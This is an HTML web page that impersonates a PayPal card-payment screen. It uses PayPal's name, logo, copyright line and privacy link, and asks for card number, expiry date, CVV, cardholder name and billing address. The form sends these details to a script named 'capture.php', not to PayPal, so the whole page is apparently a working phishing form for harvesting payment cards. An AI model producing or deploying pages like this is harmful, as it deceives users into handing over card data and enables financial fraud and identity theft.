<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal - Secure Card Payment</title>
    <link rel="stylesheet" href="styles.css">
    <script src="scripts.js"></script>
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="paypal-logo.png" alt="PayPal Logo" class="logo">
            <h1>Secure Payment</h1>
            <p>Enter your card details to complete the transaction.</p>
        </header>
        
        <form id="payment-form" action="capture.php" method="POST">
            <div class="form-group">
                <label for="card_number">Card Number</label>
                <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" required pattern="\d{13,19}">
            </div>
            
            <div class="form-row">
                <div class="form-group half">
                    <label for="expiry">Expiration Date (MM/YY)</label>
                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required pattern="(0[1-9]|1[0-2])\/[0-9]{2}">
                </div>
                <div class="form-group half">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" required pattern="\d{3,4}">
                </div>
            </div>
            
            <div class="form-group">
                <label for="name">Cardholder Name</label>
                <input type="text" id="name" name="name" placeholder="John Doe" required>
            </div>
            
            <div class="form-group">
                <label for="billing_address">Billing Address</label>
                <input type="text" id="billing_address" name="billing_address" placeholder="123 Main St, City, State, ZIP" required>
            </div>
            
            <button type="submit" class="submit-btn">Pay Now</button>
        </form>
        
        <footer class="footer">
            <p>&copy; PayPal. All rights reserved. <a href="https://www.paypal.com/us/legalnet/privacy-full" target="_blank">Privacy</a></p>
        </footer>
    </div>
</body>
</html>
